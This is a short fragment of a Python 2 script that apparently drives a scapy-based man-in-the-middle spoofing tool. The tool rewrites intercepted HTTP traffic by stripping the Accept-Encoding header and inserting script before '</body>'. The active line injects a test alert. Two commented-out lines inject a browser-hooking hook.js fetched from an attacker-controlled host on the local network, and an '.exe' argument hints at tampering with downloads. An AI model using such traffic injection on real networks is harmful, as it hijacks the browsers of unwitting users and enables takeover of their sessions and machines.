#!/root/anaconda3/envs/py2/bin python
...
if __name__ == '__main__':
    ...
    try:
        ...
        #                   "Accept-Encoding:.*?\\r\\n", tuple(("</body>", '<script src="http://192.168.1.166:3000/hook.js"></script>')))
        # sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
        #                   "Accept-Encoding:.*?\\r\\n", tuple(("</body>", '<script src="http://192.168.1.157:3000/hook.js"></script>')))
        sp_obj = NetSpoof(scapy.Raw, scapy.TCP, ".exe",
                          "Accept-Encoding:.*?\\r\\n", tuple(("</body>", '<script>alert("test");</script>')))
